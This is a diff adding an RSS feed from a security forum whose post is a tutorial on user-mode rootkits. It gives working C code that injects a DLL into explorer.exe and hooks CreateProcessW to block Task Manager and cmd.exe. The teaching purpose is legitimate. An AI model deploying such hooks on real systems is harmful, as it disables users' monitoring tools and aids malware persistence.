@@ -1,0 +1,475 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>User Mode Rootkits: IAT and Inline Hooking</title>
+    <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108</link>
+    <description>Since we&#39;ve recently covered DLLs and, in a timely manner, @0x00pf has given us a brilliant paper on [infecting processes](https://0x00sec.org/t/linux-infecting-running-processes/1097/2), I thought that I&#39;d contribute my piece on IAT hooking using a method called DLL injection. In this paper, I will be detailing an implementation of a simple _user mode rootkit_ as an example.
+
+As usual, recommended pre-requisites for this paper are as follows:
+```makefile
+C/C++ and Assembly
+WinAPI
+DLLs and DLL Injection
+Windows Memory
+```
+I will briefly cover the necessary material.
+
+Disclaimer: This is not a how to on making malware but rather a report on my research with malware technology so I apologize in advance for any incorrect information.
+
+
+
+----------
+
+## DLL Injection
+
+What is DLL injection? DLL injection is the procedure of _injecting_ a DLL into the memory space of a process and then having it execute as a part of it. Doing this means that the DLL code has all access to the process&#39;s memory and can manipulate it for whatever reason but more importantly, it also acquires all the permissions of the process. For example, you wish to communicate to the outside world but you don&#39;t have permissions through the firewall. With DLL injection, you can inject and execute your code into a process which _does_ have the permissions (e.g. Internet Explorer) and it will be able to do what it needs.
+
+```makefile
++--------------+               +--------------------+
+| DLL Injector |               |       Target       |
++--------------+               |      process&#39;s     |
+        |                      |       address      |
+        |                      |        space       |
+        |                      |                    |
+        |                      |--------------------|
+        +-----------------------&gt;   Injected DLL    |
+                               |--------------------|
+                               +--------------------+
+```
+
+If anyone is interested on how to code a basic DLL injector, please let me know down below.
+
+
+
+----------
+
+## User Mode Rootkits
+
+User mode rootkits are _rootkits_ (though not technically) which provide similar functionalities as kernel mode rootkits, such as masking and disabling access to files, but operate at the user level. We call this level _ring 3_ whereas kernel mode rootkits are _ring 0_. What are these rings? Here&#39;s a diagram for visual aid.
+
+&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/a/a84f27ca27596463b36e7ac288cbc7dc9e1ff5ad.png&#39;&gt;
+
+As we can see, the green is user mode and the red in the center is kernel mode. Although rings 1 and 2 do exist, they are actually not used so we just refer to either 0 or 3.
+
+The WinAPI function calls are called from ring 3 which must go inwards to ring 0 through a series of privilege checks since ring 3 cannot directly communicate with the CPU. Once in ring 0, the OS executes the instructions to perform what&#39;s necessary for the function call. By doing this, the API _trusts_ that the parameters passed from ring 3 to 0 and back will maintain its integrity and not be modified.
+
+
+
+----------
+
+## The Import Address Table and Exported DLL Functions
+
+What is the IAT? The IAT is the Import Address Table. I&#39;ve very briefly introduced this concept in [Understanding a Win32 Virus: Background Material](https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043/7) but I will explain in more depth this time. The IAT is the table which contains _imports_ of a DLL&#39;s exports and these two tables are pretty similar in structure. Here&#39;s an example of an IAT of an application:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c337746f698a53ffceaf493f534958f76aa935da.PNG&quot; width=&quot;690&quot; height=&quot;354&quot;&gt;
+
+What we&#39;re interested in is the Directory Table just a bit below the address table.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/b2f53a1149d746e33c1e6e7e185972384d645b00.PNG&quot; width=&quot;690&quot; height=&quot;352&quot;&gt;
+
+Here, we can see a few details about each of the imported DLLs which correspond to the following struct (which I believe is undocumented for some reason):
+```cpp
+typedef struct _IMAGE_IMPORT_DESCRIPTOR {
+    DWORD OriginalFirstThunk;
+    DWORD TimeDateStamp;
+    DWORD ForwarderChain;
+    DWORD Name;
+    DWORD FirstThunk;
+} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;
+```
+If we have a look at the `OriginalFirstThunk` member, we will see that it is _exactly_ the same as the `FirstThunk` member which are both arrays of `IMAGE_THUNK_DATA`.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/522512a07f5a60c8375b607a76127d20fa44840b.PNG&quot; width=&quot;690&quot; height=&quot;354&quot;&gt;
+
+Having these duplicates is not a matter of inefficiency because the `FirstThunk` will be replaced on runtime by the Windows loader with the actual address of the DLLs&#39; exported functions. Here&#39;s the comparison of the memory dump of both the `OriginalFirstThunk` and the `FirstThunk` juxtaposed with the PEview of the `FirstThunk`.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/2c8d5cebd637221c5fc8014afb4c1782342b79f9.PNG&quot; width=&quot;690&quot; height=&quot;274&quot;&gt;
+
+We can see that the memory dump of RVA `0x2000` no longer holds the value of `0x2890` but instead holds `0x75BB5414` which corresponds to the address of the `GetFileAttributesA` function in `kernel32` whereas the memory dump of the `OriginalFirstThunk` remains the same `0x2890`.
+
+Now that we have an idea of how DLLs&#39; exported functions are substituted into the import table of an executable, let&#39;s now examine what the function looks like and how it works.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a91e204711018db1a9fd72bf14d3e8589f19d75f.PNG&quot; width=&quot;602&quot; height=&quot;289&quot;&gt;
+
+Most WinAPI wrapper functions usually have the five byte stub at the beginning:
+```makefile
+mov    edi, edi
+push   ebp
+mov    ebp, esp
+```
+After this comes the actual function itself which is just a `jmp` but for this paper, we will not actually be going any deeper than this. What&#39;s interesting about this is the stub at the beginning because it allows us to overwrite the bytes to place in a method to _hook_ the function call which then means we can potentially modify the parameters. This is breaking the trust between the API calls from ring 3 to ring 0.
+
+
+
+----------
+
+## Example Implementation
+
+For the DLL, it will not be exporting any functions since its purpose is to modify the stub in the wrapper of a target function in its own process. First, we will need to define [`DllMain`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx) like so:
+```c
+BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)MyUnhandledExceptionFilter);
+            HookFunction();
+            break;
+    }
+
+    return TRUE;
+}
+```
+`DllMain` will be called when the DLL has been executed so just think of it as a normal `main` for now. The `fdwReason` is used to detect under which circumstance the `DllMain` has been called, so for this purpose we will only initialize the hooking when it has been attached to a process. In this method we will be raising exceptions to detect `RIP` (Instruction Pointer) executing in the target function&#39;s entry so we set up a custom defined exception handler `MyUnhandledExceptionFilter` and then we will set up the hook. Let&#39;s take a look at the exception filter function.
+```c
+LONG WINAPI MyUnhandledExceptionFilter(LPEXCEPTION_POINTERS lpException) {
+    if (lpException-&gt;ContextRecord-&gt;Rip == (DWORD_PTR)fpCreateProcessW)
+        lpException-&gt;ContextRecord-&gt;Rip = (DWORD_PTR)MyCreateProcessW;
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+```
+Once an exception has occurred, program flow will enter this function first. It checks to see if it has entered our target function `CreateProcessW` and if it has, we will point `RIP` to our intercepting function for extra processing, otherwise, it will continue execution normally. For the routine to hook the target function, we will simply set the _first_ byte of the stub to an `int 3h` which is the debuggers&#39; method of placing a breakpoint.
+```c
+VOID HookFunction(VOID) {
+    fpCreateProcessW = GetProcAddress(LoadLibrary(L&quot;kernel32&quot;), &quot;CreateProcessW&quot;);
+    if (fpCreateProcessW == NULL) {
+        Debug(L&quot;Get CreateFile error: %lu&quot;, GetLastError()); 
+        return;
+    }
+
+    bSavedByte = *(LPBYTE)fpCreateProcessW;
+
+    const BYTE bInt3 = 0xCC;
+    if (WriteMemory(fpCreateProcessW, &amp;bInt3, sizeof(BYTE)) == FALSE) {
+        Debug(L&quot;Write memory error: %lu&quot;, GetLastError());
+        ExitThread(0);
+    }
+}
+```
+It needs to get the address of the function first through `GetProcAddress` and `LoadLibraryW` with `kernel32` and `CreateProcessW` so that it knows where to modify the stub. Before placing the exception, it must save the original first byte so that it can restore it if our hook function (`MyCreateProcessW`, not `HookFunction`) actually calls the function. If you don&#39;t understand this, don&#39;t worry, it will make sense when we analyze `MyCreateProcessW`. To place the `int 3h` byte (`0xCC`) we need to _unprotect_ the memory and then write to it, then _reprotect_ it like so:
+```c
+BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
+    DWORD dwOldProt = 0;
+    if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &amp;dwOldProt) == FALSE)
+        return FALSE;
+
+    MoveMemory(fpFunc, b, size);
+
+    return VirtualProtect(fpFunc, size, dwOldProt, &amp;dwOldProt);
+}
+```
+Using `VirtualProtect`, we can do this with ease. We&#39;ll modify the permissions of the memory space to be able to write to it, write the byte in, then restore the original permissions. Now, when the target process tries to use `CreateProcessW`, it will trigger the exception on the `int 3h` byte and enter our exception handler. Our exception handler will then redirect execution flow to `MyCreateProcessW`:
+```c
+BOOL WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
+    WCHAR szLowerCase[MAX_PATH];
+    StringToLowerCase(szLowerCase, lpApplicationName);
+
+    if (wcsstr(szLowerCase, L&quot;taskmgr.exe&quot;) != NULL ||
+        wcsstr(szLowerCase, L&quot;cmd.exe&quot;) != NULL) {
+        Debug(L&quot;Open %s denied&quot;, lpApplicationName);
+        SetLastError(ERROR_ACCESS_DENIED);
+        return FALSE;
+    }
+
+    if (WriteMemory(fpCreateProcessW, &amp;bSavedByte, sizeof(BYTE)) == FALSE) {
+        Debug(L&quot;MyCreateProcessW WriteMemory error: %lu&quot;, GetLastError());
+        ExitThread(0);
+    }
+    
+    BOOL b = CreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
+
+    HookFunction();
+    return b;
+}
+```
+This function emulates the real function&#39;s return value, the calling convention and the arguments so nothing breaks. We then check to see if the `lpApplicationName` matches any of the programs which we want to deny access to and if it does, it will spawn a `Debug` message (this is optional) and then set the error to an access denied, then return FALSE (as the actual function would on failure). Otherwise, we will simply restore the original byte in `CreateProcessW`&#39;s stub and then call it by directly passing the arguments. We will re-hook the function to reset the `int 3h` byte so that it will trigger again on the next call, then return its return value.
+
+
+
+----------
+
+## Demonstration
+
+Let&#39;s do a demonstration and see this DLL in action. We will try injecting the DLL into `explorer.exe` and see what happens when we open some applications.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/27017903f8025f1b30d8b6d6115f1e1aa62c4ad0.PNG&quot; width=&quot;690&quot; height=&quot;285&quot;&gt;
+
+Don&#39;t mind me, just using a public injector because I&#39;m too lazy to write my own (I should get paid for advertising this). Anyway... Let&#39;s try something that isn&#39;t on the list of denied applications:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/4781fe8d981ffdf52b909e97fd10e518ace18a1b.PNG&quot; width=&quot;671&quot; height=&quot;336&quot;&gt;
+
+Looking good so far. How about something that we&#39;re expecting to be denied?
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c18a6e6156df116cdf030348c0ca35d901a3e3ad.PNG&quot; width=&quot;560&quot; height=&quot;304&quot;&gt;
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/fbb23456fb1d34bc0904a805210d0b50686516d9.PNG&quot; width=&quot;644&quot; height=&quot;266&quot;&gt;
+
+or...
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/e8a71e082011e60f149b53164a8b37fcf4288d46.PNG&quot; width=&quot;520&quot; height=&quot;307&quot;&gt;
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d50be8e3c6427c82195110916045b70dcce29b9a.PNG&quot; width=&quot;622&quot; height=&quot;332&quot;&gt;
+
+
+
+----------
+
+## Conclusion
+
+So there we have it, IAT hooking with DLL injections to intercept API function calls. There are other ways to hook the function such as placing a direct jump to the hook function but I found that this particular method was easier to implement. This is a pretty well-known technique so don&#39;t expect this to work in every scenario and not get caught by antivirus. 
+
+Hope that you&#39;ve all enjoyed and learned something from this. Until next time.
+
+_-- dtm_</description>
+    
+    <lastBuildDate>Fri, 22 Dec 2017 00:42:09 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/8</link>
+        <pubDate>Fri, 22 Dec 2017 00:57:32 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-8</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/7</link>
+        <pubDate>Fri, 22 Dec 2017 00:42:09 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-7</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 5 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/6</link>
+        <pubDate>Sat, 02 Dec 2017 18:00:14 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-6</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[Malware_Info]]></dc:creator>
+        <description><![CDATA[
+            <p>Your tutorial is great! Do malware’s detect hooks before executing? I’m using Detours from Microsoft,I’ve tested it on a simple application and it is working.Same technique when applied on real malware not working much</p>
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/5</link>
+        <pubDate>Mon, 27 Nov 2017 07:19:29 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-5</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[Fust3rCluck]]></dc:creator>
+        <description><![CDATA[
+            <p>if (post_is_awesome){<br>
+gestures.thumbs_up();<br>
+}</p>
+<p><code>STDOUT: THUMBS UP</code></p>
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/4</link>
+        <pubDate>Sat, 24 Sep 2016 04:18:07 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-4</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
+        <description><![CDATA[
+            <p>I would <strong>greatly</strong> appreciate a tutorial on DLL-Injection! Big thanks for your Low-level series <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/3</link>
+        <pubDate>Sun, 18 Sep 2016 09:23:08 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-3</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>BRUH. WINAPI THO. Really awesome. Really Really awesome.</p>
+          <p><a href="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108/2</link>
+        <pubDate>Sun, 18 Sep 2016 07:50:31 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-1108-2</guid>
+        <source url="https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108.rss">User Mode Rootkits: IAT and Inline Hooking</source>
+      </item>
+      <item>
+        <title>User Mode Rootkits: IAT and Inline Hooking</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Since we’ve recently covered DLLs and, in a timely manner, <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> has given us a brilliant paper on <a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/2">infecting processes</a>, I thought that I’d contribute my piece on IAT hooking using a method called DLL injection. In this paper, I will be detailing an implementation of a simple <em>user mode rootkit</em> as an example.</p>
+<p>As usual, recommended pre-requisites for this paper are as follows:</p>
+<pre><code class="lang-makefile">C/C++ and Assembly
+WinAPI
+DLLs and DLL Injection
+Windows Memory
+</code></pre>
+<p>I will briefly cover the necessary material.</p>
+<p>Disclaimer: This is not a how to on making malware but rather a report on my research with malware technology so I apologize in advance for any incorrect information.</p>
+<hr>
+<h2>DLL Injection</h2>
+<p>What is DLL injection? DLL injection is the procedure of <em>injecting</em> a DLL into the memory space of a process and then having it execute as a part of it. Doing this means that the DLL code has all access to the process’s memory and can manipulate it for whatever reason but more importantly, it also acquires all the permissions of the process. For example, you wish to communicate to the outside world but you don’t have permissions through the firewall. With DLL injection, you can inject and execute your code into a process which <em>does</em> have the permissions (e.g. Internet Explorer) and it will be able to do what it needs.</p>
+<pre><code class="lang-makefile">+--------------+               +--------------------+
+| DLL Injector |               |       Target       |
++--------------+               |      process's     |
+        |                      |       address      |
+        |                      |        space       |
+        |                      |                    |
+        |                      |--------------------|
+        +-----------------------&gt;   Injected DLL    |
+                               |--------------------|
+                               +--------------------+
+</code></pre>
+<p>If anyone is interested on how to code a basic DLL injector, please let me know down below.</p>
+<hr>
+<h2>User Mode Rootkits</h2>
+<p>User mode rootkits are <em>rootkits</em> (though not technically) which provide similar functionalities as kernel mode rootkits, such as masking and disabling access to files, but operate at the user level. We call this level <em>ring 3</em> whereas kernel mode rootkits are <em>ring 0</em>. What are these rings? Here’s a diagram for visual aid.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a84f27ca27596463b36e7ac288cbc7dc9e1ff5ad.png"></p>
+<p>As we can see, the green is user mode and the red in the center is kernel mode. Although rings 1 and 2 do exist, they are actually not used so we just refer to either 0 or 3.</p>
+<p>The WinAPI function calls are called from ring 3 which must go inwards to ring 0 through a series of privilege checks since ring 3 cannot directly communicate with the CPU. Once in ring 0, the OS executes the instructions to perform what’s necessary for the function call. By doing this, the API <em>trusts</em> that the parameters passed from ring 3 to 0 and back will maintain its integrity and not be modified.</p>
+<hr>
+<h2>The Import Address Table and Exported DLL Functions</h2>
+<p>What is the IAT? The IAT is the Import Address Table. I’ve very briefly introduced this concept in <a href="https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043/7">Understanding a Win32 Virus: Background Material</a> but I will explain in more depth this time. The IAT is the table which contains <em>imports</em> of a DLL’s exports and these two tables are pretty similar in structure. Here’s an example of an IAT of an application:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c337746f698a53ffceaf493f534958f76aa935da.PNG" width="690" height="354"></p>
+<p>What we’re interested in is the Directory Table just a bit below the address table.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b2f53a1149d746e33c1e6e7e185972384d645b00.PNG" width="690" height="352"></p>
+<p>Here, we can see a few details about each of the imported DLLs which correspond to the following struct (which I believe is undocumented for some reason):</p>
+<pre><code class="lang-cpp">typedef struct _IMAGE_IMPORT_DESCRIPTOR {
+    DWORD OriginalFirstThunk;
+    DWORD TimeDateStamp;
+    DWORD ForwarderChain;
+    DWORD Name;
+    DWORD FirstThunk;
+} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;
+</code></pre>
+<p>If we have a look at the <code>OriginalFirstThunk</code> member, we will see that it is <em>exactly</em> the same as the <code>FirstThunk</code> member which are both arrays of <code>IMAGE_THUNK_DATA</code>.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/522512a07f5a60c8375b607a76127d20fa44840b.PNG" width="690" height="354"></p>
+<p>Having these duplicates is not a matter of inefficiency because the <code>FirstThunk</code> will be replaced on runtime by the Windows loader with the actual address of the DLLs’ exported functions. Here’s the comparison of the memory dump of both the <code>OriginalFirstThunk</code> and the <code>FirstThunk</code> juxtaposed with the PEview of the <code>FirstThunk</code>.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2c8d5cebd637221c5fc8014afb4c1782342b79f9.PNG" width="690" height="274"></p>
+<p>We can see that the memory dump of RVA <code>0x2000</code> no longer holds the value of <code>0x2890</code> but instead holds <code>0x75BB5414</code> which corresponds to the address of the <code>GetFileAttributesA</code> function in <code>kernel32</code> whereas the memory dump of the <code>OriginalFirstThunk</code> remains the same <code>0x2890</code>.</p>
+<p>Now that we have an idea of how DLLs’ exported functions are substituted into the import table of an executable, let’s now examine what the function looks like and how it works.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a91e204711018db1a9fd72bf14d3e8589f19d75f.PNG" width="602" height="289"></p>
+<p>Most WinAPI wrapper functions usually have the five byte stub at the beginning:</p>
+<pre><code class="lang-makefile">mov    edi, edi
+push   ebp
+mov    ebp, esp
+</code></pre>
+<p>After this comes the actual function itself which is just a <code>jmp</code> but for this paper, we will not actually be going any deeper than this. What’s interesting about this is the stub at the beginning because it allows us to overwrite the bytes to place in a method to <em>hook</em> the function call which then means we can potentially modify the parameters. This is breaking the trust between the API calls from ring 3 to ring 0.</p>
+<hr>
+<h2>Example Implementation</h2>
+<p>For the DLL, it will not be exporting any functions since its purpose is to modify the stub in the wrapper of a target function in its own process. First, we will need to define <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx"><code>DllMain</code></a> like so:</p>
+<pre><code class="lang-auto">BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)MyUnhandledExceptionFilter);
+            HookFunction();
+            break;
+    }
+
+    return TRUE;
+}
+</code></pre>
+<p><code>DllMain</code> will be called when the DLL has been executed so just think of it as a normal <code>main</code> for now. The <code>fdwReason</code> is used to detect under which circumstance the <code>DllMain</code> has been called, so for this purpose we will only initialize the hooking when it has been attached to a process. In this method we will be raising exceptions to detect <code>RIP</code> (Instruction Pointer) executing in the target function’s entry so we set up a custom defined exception handler <code>MyUnhandledExceptionFilter</code> and then we will set up the hook. Let’s take a look at the exception filter function.</p>
+<pre><code class="lang-auto">LONG WINAPI MyUnhandledExceptionFilter(LPEXCEPTION_POINTERS lpException) {
+    if (lpException-&gt;ContextRecord-&gt;Rip == (DWORD_PTR)fpCreateProcessW)
+        lpException-&gt;ContextRecord-&gt;Rip = (DWORD_PTR)MyCreateProcessW;
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+</code></pre>
+<p>Once an exception has occurred, program flow will enter this function first. It checks to see if it has entered our target function <code>CreateProcessW</code> and if it has, we will point <code>RIP</code> to our intercepting function for extra processing, otherwise, it will continue execution normally. For the routine to hook the target function, we will simply set the <em>first</em> byte of the stub to an <code>int 3h</code> which is the debuggers’ method of placing a breakpoint.</p>
+<pre><code class="lang-auto">VOID HookFunction(VOID) {
+    fpCreateProcessW = GetProcAddress(LoadLibrary(L"kernel32"), "CreateProcessW");
+    if (fpCreateProcessW == NULL) {
+        Debug(L"Get CreateFile error: %lu", GetLastError()); 
+        return;
+    }
+
+    bSavedByte = *(LPBYTE)fpCreateProcessW;
+
+    const BYTE bInt3 = 0xCC;
+    if (WriteMemory(fpCreateProcessW, &amp;bInt3, sizeof(BYTE)) == FALSE) {
+        Debug(L"Write memory error: %lu", GetLastError());
+        ExitThread(0);
+    }
+}
+</code></pre>
+<p>It needs to get the address of the function first through <code>GetProcAddress</code> and <code>LoadLibraryW</code> with <code>kernel32</code> and <code>CreateProcessW</code> so that it knows where to modify the stub. Before placing the exception, it must save the original first byte so that it can restore it if our hook function (<code>MyCreateProcessW</code>, not <code>HookFunction</code>) actually calls the function. If you don’t understand this, don’t worry, it will make sense when we analyze <code>MyCreateProcessW</code>. To place the <code>int 3h</code> byte (<code>0xCC</code>) we need to <em>unprotect</em> the memory and then write to it, then <em>reprotect</em> it like so:</p>
+<pre><code class="lang-auto">BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
+    DWORD dwOldProt = 0;
+    if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &amp;dwOldProt) == FALSE)
+        return FALSE;
+
+    MoveMemory(fpFunc, b, size);
+
+    return VirtualProtect(fpFunc, size, dwOldProt, &amp;dwOldProt);
+}
+</code></pre>
+<p>Using <code>VirtualProtect</code>, we can do this with ease. We’ll modify the permissions of the memory space to be able to write to it, write the byte in, then restore the original permissions. Now, when the target process tries to use <code>CreateProcessW</code>, it will trigger the exception on the <code>int 3h</code> byte and enter our exception handler. Our exception handler will then redirect execution flow to <code>MyCreateProcessW</code>:</p>
+<pre><code class="lang-auto">BOOL WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
+    WCHAR szLowerCase[MAX_PATH];
+    StringToLowerCase(szLowerCase, lpApplicationName);
+
+    if (wcsstr(szLowerCase, L"taskmgr.exe") != NULL ||
+        wcsstr(szLowerCase, L"cmd.exe") != NULL) {
+        Debug(L"Open %s denied", lpApplicationName);
+        SetLastError(ERROR_ACCESS_DENIED);
+        return FALSE;
+    }
+
+    if (WriteMemory(fpCreateProcessW, &amp;bSavedByte, sizeof(BYTE)) == FALSE) {
+        Debug(L"MyCreateProcessW WriteMemory error: %lu", GetLastError());
+        ExitThread(0);
+    }
+    
+    BOOL b = CreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
+
+    HookFunction();
+    return b;
+}
+</code></pre>
+<p>This function emulates the real function’s return value, the calling convention and the arguments so nothing breaks. We then check to see if the <code>lpApplicationName</code> matches any of the programs which we want to deny access to and if it does, it will spawn a <code>Debug</code> message (this is optional) and then set the error to an access denied, then return FALSE (as the actual function would on failure). Otherwise, we will simply restore the original byte in <code>CreateProcessW</code>'s stub and then call it by directly passing the arguments. We will re-hook the function to reset the <code>int 3h</code> byte so that it will trigger again on the next call, then return its return value.</p>
+<hr>
+<h2>Demonstration</h2>
+<p>Let’s do a demonstration and see this DLL in action. We will try injecting the DLL into <code>explorer.exe</code> and see what happens when we open some applications.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/27017903f8025f1b30d8b6d6115f1e1aa62c4ad0.PNG" width="690" height="285"></p>
+<p>Don’t mind me, just using a public injector because I’m too lazy to write my own (I should get paid for advertising this). Anyway… Let’s try something that isn’t on the list of denied applications:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/4781fe8d981ffdf52b909e97fd10e518ace18a1b.PNG" width="671" height="336"></p>
+<p>Looking good so far. How about something that we’re expecting to be denied?</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c18a6e6156df116cdf030348c0ca35d901a3e3ad.PNG" width="560" height="304"></p>
